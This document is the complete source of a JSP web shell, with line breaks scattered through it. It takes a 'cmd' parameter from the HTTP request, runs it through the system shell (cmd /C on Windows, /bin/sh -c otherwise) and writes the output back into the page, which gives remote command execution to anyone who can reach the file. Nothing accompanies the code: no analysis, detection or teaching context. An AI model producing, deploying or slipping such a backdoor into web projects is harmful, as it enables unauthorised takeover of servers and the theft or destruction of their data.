<%@ page import="
java.util
.*,java.io.*"%>
<%
String 
cmd
;
String[] 
cmdarr
;
String OS = 
System.getProperty
("os.name
");
if (
request.getParameter
("
cmd
") != null) 
{
cmd
= new String (
request.getParameter
("
cmd
"));
if (
OS.startsWith
("Windows")) 
{
cmdarr
= new String [] {"
cmd
", "/C", 
cmd
};
}
else 
{
cmdarr
= new String [] {"/bin/
sh
", "
-
c", 
cmd
};
}
Process 
p = 
Runtime.getRuntime
().exec(
cmdarr
);
OutputStream
os
= 
p.getOutputStream
();
InputStream
in = 
p.getInputStream
();
DataInputStream
dis = new 
DataInputStream
(in);
String 
disr
= 
dis.readLine
();
while ( 
disr
!= null ) 
{
out.println
(
disr
);
disr
= 
dis.readLine
();
}
}
%>
